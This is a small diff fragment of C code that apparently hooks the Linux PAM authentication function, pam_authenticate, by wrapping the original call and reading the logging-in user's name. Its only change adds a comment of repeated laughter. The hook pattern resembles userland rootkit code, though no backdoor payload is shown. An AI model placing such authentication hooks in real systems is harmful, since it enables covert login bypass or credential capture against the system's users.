@@ -7,6 +7,7 @@ int pam_authenticate(pam_handle_t *pamh, int flags)
     HOOK(old_pam_authenticate, CPAM_AUTHENTICATE);
  
     void *user;
+    // hahahahahahahahahahahahahahahahahahahahaha
     pam_get_item(pamh, PAM_USER, (const void **)&user);
     if((char *)user == NULL) return old_pam_authenticate(pamh, flags);
 
